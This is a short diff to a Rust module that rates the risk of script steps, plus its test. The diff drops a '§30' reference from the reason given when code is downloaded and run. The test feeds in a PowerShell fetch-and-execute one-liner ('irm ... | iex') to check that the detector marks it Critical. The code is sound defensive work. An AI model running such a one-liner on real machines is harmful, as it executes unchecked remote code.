@@ -201,7 +201,7 @@ pub fn assess(step: &Step, lines: &[(&str, Option<&LineAnalysis>)]) -> Assessmen
             }
         }
         if DOWNLOAD.iter().any(|d| lower.contains(d)) && EXECUTE.iter().any(|e| lower.contains(e)) {
-            a.raise(RiskLevel::Critical, "downloads code and runs it without staging or checking it (§30)");
+            a.raise(RiskLevel::Critical, "downloads code and runs it without staging or checking it");
         }
         match analysis {
             Some(line) => {
@@ -324,7 +324,7 @@ mod tests {
         let l = line(json!([cmdlet("Invoke-RestMethod", &[]), cmdlet("Invoke-Expression", &[])]));
         let a = assess(&step(json!({})), &[("irm https://example.test/install.ps1 | iex", Some(&l))]);
         assert_eq!(a.level, RiskLevel::Critical);
-        assert!(a.reasons.iter().any(|r| r.contains("§30")));
+        assert!(a.reasons.iter().any(|r| r.contains("without staging or checking it")));
     }
 
     #[test]
